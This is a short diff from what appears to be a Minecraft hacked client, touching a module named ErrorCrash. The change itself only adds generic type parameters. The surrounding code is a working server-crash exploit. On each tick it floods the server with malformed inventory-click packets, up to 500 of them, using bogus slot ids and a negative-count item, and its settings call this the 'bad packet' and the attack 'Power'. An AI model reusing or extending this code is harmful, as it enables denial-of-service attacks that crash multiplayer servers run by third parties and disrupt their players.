@@ -21,7 +21,7 @@ import net.shadow.client.feature.module.ModuleType;
 
 public class ErrorCrash extends Module {
 
-    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<Mode>(Mode.Click).name("Mode").description("what bad packet to send").get());
+    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.Click).name("Mode").description("what bad packet to send").get());
     final DoubleSetting pwr = this.config.create(new DoubleSetting.Builder(5).min(1).max(500).name("Power").description("Force to attack with").get());
 
     public ErrorCrash() {
@@ -32,7 +32,7 @@ public class ErrorCrash extends Module {
     public void tick() {
         switch (mode.getValue()) {
             case Click -> {
-                Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap();
+                Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap<>();
                 ripbozo.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
                 for (int i = 0; i < pwr.getValue(); i++) {
                     client.player.networkHandler.sendPacket(new ClickSlotC2SPacket(client.player.currentScreenHandler.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), ripbozo));
